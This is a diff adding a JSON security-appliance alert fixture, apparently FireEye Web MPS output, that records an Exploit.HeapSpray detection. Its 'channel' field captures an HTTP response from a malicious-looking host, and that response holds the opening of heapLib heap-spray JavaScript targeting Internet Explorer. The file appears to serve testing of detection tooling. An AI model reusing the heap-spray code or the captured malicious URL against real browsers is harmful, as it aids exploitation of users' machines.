@@ -1,0 +1,66 @@
+{
+    "appliance-id": "86:C3:2F:5E:B1:1C",
+    "product": "CMS",
+    "version": "10.0.2.1003075",
+    "appliance": "tanuj-cm2500-verodin.eng.fireeye.com",
+    "msg": "extended",
+    "alert": {
+      "id": "44053",
+      "name": "infection-match",
+      "uuid": "afd2b541-288c-46c9-9612-c66f150d4ec0",
+      "ack": "no",
+      "sc-version": "1498.130",
+      "appliance-id": "00:0B:AB:C9:61:5A",
+      "product": "Web MPS",
+      "version": "10.0.2.1002958",
+      "sensor": "tanuj-4500-2",
+      "severity": "minr",
+      "sensor-ip": "172.16.179.64",
+      "root-infection": "40714",
+      "explanation": {
+        "analysis": "content",
+        "protocol": "tcp",
+        "malware-detected": {
+          "malware": {
+            "sid": "84400048",
+            "name": "Exploit.HeapSpray",
+            "stype": "bot-command"
+          }
+        },
+        "cnc-services": {
+          "cnc-service": {
+            "port": "80",
+            "protocol": "tcp",
+            "type": "SignatureMatch",
+            "sid": "84400048",
+            "sname": "Exploit.HeapSpray",
+            "address": "83.63.230.74",
+            "channel": "GET http://r3k84zm14o.pppdiy.com/tl/xop.html HTTP/1.1\r\nHost: r3k84zm14o.pppdiy.com\r\nHTTP/1.0 200 OK\r\nDate: Wed, 17 Apr 2013 10:00:03 GMT\r\nServer: Apache/2.2.3 (CentOS)\r\nLast-Modified: Fri, 29 Mar 2013 16:42:38 GMT\r\nETag: \"768127-26de-f57b9b80\"\r\nAccept-Ranges: bytes\r\nContent-Length: 9950\r\nContent-Type: text/html; charset=GB2312\r\nX-Cache: MISS from localhost\r\nX-Cache-Lookup: MISS from localhost:80\r\nVia: 1.0 localhost (squid/3.1.19)\r\nConnection: keep-alive\r\n\r\n<html> \r\n<head> \r\n<meta http-equiv=\"X-UA-Compatible\" content=\"IE=7\">\r\n<script> \r\nfunction heapLib() {\r\n}\r\nheapLib.ie = function(maxAlloc, heapBase) {\r\n    this.maxAlloc = (maxAlloc ? maxAlloc : 65535);\r\n    this.heapBase = (heapBase ? heapBase : 0x150000);\r\n    this.paddingStr = \"AAAA\";\r\n    while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {\r\n        this.paddingStr += this.paddingStr;\r\n    }\r\n    this.mem = new Array();\r\n    this.flushOleaut32();\r\n}\r\n\r\nheapLib.ie.prototype.debug = function(msg) {\r\n    void(Math.atan2(0xbabe, msg));\r\n}\r\n\r\nheapLib.ie.prototype.debugHeap = function(enable) {\r\n    if (enable == true)\r\n        void(Math.atan(0xbabe));\r\n    else\r\n        void(Math.asin(0xbabe));\r\n}\r\n\r\nheapLib.ie.prototype.debugBreak = function(msg) {\r\n    void(Math.acos(0xbabe));\r\n}\r\n\r\nheapLib.ie.prototype.padding = function(len) {\r\n    if (len > this.paddingStr.length)\r\n        throw \"Requested padding string length \" + len + \", only \" + this.paddingStr.length + \" available\";\r\n    return this.paddingStr.substr(0, len);\r\n}\r\n\r\nheapLib.ie.prototype.round = function(",
+            "host": "r3k84zm14o.pppdiy.com",
+            "url": "hxxp://r3k84zm14o.pppdiy.com/tl/xop.html"
+          }
+        }
+      },
+      "src": {
+        "vlan": "0",
+        "ip": "83.63.230.74",
+        "mac": "02:2b:5a:04:35:a6",
+        "port": "80"
+      },
+      "dst": {
+        "ip": "235.62.235.105",
+        "mac": "00:20:18:11:ff:4e",
+        "port": "1065"
+      },
+      "interface": {
+        "label": "A1",
+        "mode": "tap",
+        "interface": "pether3"
+      },
+      "action": "notified",
+      "alert-url": "https://tanuj-cm2500-verodin.eng.fireeye.com/detection/objects?uuid=afd2b541-288c-46c9-9612-c66f150d4ec0",
+      "occurred": "2024-08-12T20:32:30Z",
+      "attack-time": "2024-08-12T20:32:30Z"
+    }
+  }
+  
